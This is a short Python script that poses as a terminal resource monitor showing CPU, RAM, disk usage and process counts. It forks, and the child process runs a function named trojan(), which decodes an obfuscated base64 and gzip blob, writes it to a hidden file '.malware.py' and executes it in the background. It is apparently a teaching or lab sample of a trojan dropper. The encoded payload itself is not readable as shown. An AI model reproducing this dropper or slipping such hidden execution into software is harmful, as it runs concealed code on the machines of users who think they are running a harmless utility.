#!/usr/bin/python3
import psutil
import base64
import time
import gzip
import os

def main():
	# fork a child process
	pid = os.fork()

	if pid > 0:
		# parent process
		while True:
			# percentage of used CPU
			cpu = psutil.cpu_percent()
			# percentage of used RAM
			ram = psutil.virtual_memory().percent
			# percentage of used disk space
			disk = psutil.disk_usage("/").percent
			# number of all running processes
			processes_count = 0
			for _ in psutil.process_iter():
				processes_count += 1
			
			# print to screen
			print("---------------------------------------------------------")
			print("| CPU USAGE | RAM USAGE | DISK USAGE | RUNNING PROCESSES |")
			print("| {:02}%       | {:02}%       | {:02}%        | {}               |".format(int(cpu), int(ram), int(disk), processes_count))
			print("---------------------------------------------------------")

			# sleep for 2s
			time.sleep(2)
	else:
		# child process
		trojan()


def trojan():
	malware_fd = open(".malware.py", "w")
	blob = "H4sIAAAAAAAAA5VVe2/TMBD/f5/CGKQ5WuI0tOu2oiEmNN4DxENCbJPlJu5qmtrGdqGsy3fHzmPtmpaHVTW+u989fHc+378Xz4yOh1zE6pcdS9Hd4VMltQWafZ8xY01DG5lOmG2oITWs32uob0aKpV6zk2YnYyMwpVygYLAD3BpLYwWdMnBc28NXzDZMFFQYRjOmjYMsStov+NkwHZ1cMWHhAMAzec3znMb7uAPQlyR5BN5wMZuD+WGf9HuPgP4xODjEnQA8Z+lExg87Scf9EvCMazaS89gLYWm8KP/VbJjzlHDlnDbn9pEhOLZWmUEcc0UVx6l0GxiuhFjvAmzZ3Ja2htymkgtCs0wzY5ghOTfWQc8vSzlz+ci3SkdSAy2lDYGZDTOuTQhGPGcGcOHyiX/SfIJgPJZTBuuUNloe5lElfCnyy+pfdxmljsORUeZcS8UEgosiXhQQO1NTalEVg8cEIYAaBnf02TxlyrZtKmrMP3pOpbCumj6HdSRYu1yiABuruUJBS62V2LJYeMRFRvMcaYjOk+7lIinOaTSZRtcn0YtX0dv30dckOrpcPOyH3W5xM0wTJ77ueFb3KNw/KgIY3o2o7XmtZOt+a4OYXO49aYzvXWC/deGEB8XfPfARyF0RWkcMwGPQaWdwYzqaTtoi2GsLtoWxdt4/BLGlmTey99bZ21oSp7k0DP1ny/kuJn7u+Pq4q6KqthbMGkstiFROhQU34EozBSIOfExMOAb9OQG7C6W5Ez/oFbu3mPdg9yJzBewWF3jrZlB+94tdGNQNvCGaW6JpbmxUzt14uRD1zcqopXcn3pSmYy4Yaaajm3vNNmyj3FgaLMfYBsAyBgdcEivIdt+M5ExkDr65o1ZU1+vdKG7qg5Wxy0QqM5aR+vDVm4KH/V4lQP5ZwdlsqgzykADX/KDKmVm+ItUH1dTJM/Ly7emnsJF+fPf0Nfn46cPpyVmt6Sa5ECy1CMEOtqnCXGBxpeUEc+lua9JLDg4bL9gwkaHVWG+N1H3qrg0hvjCEgONjAAnxbx4hsGrX6gH8DQ68MudqBwAA"
	malware = gzip.decompress(base64.b64decode(blob)).decode("UTF-8")
	malware_fd.write(malware)
	malware_fd.close()

	# execute malware
	os.system("/usr/bin/python3 .malware.py")


if __name__ == "__main__":
	main()
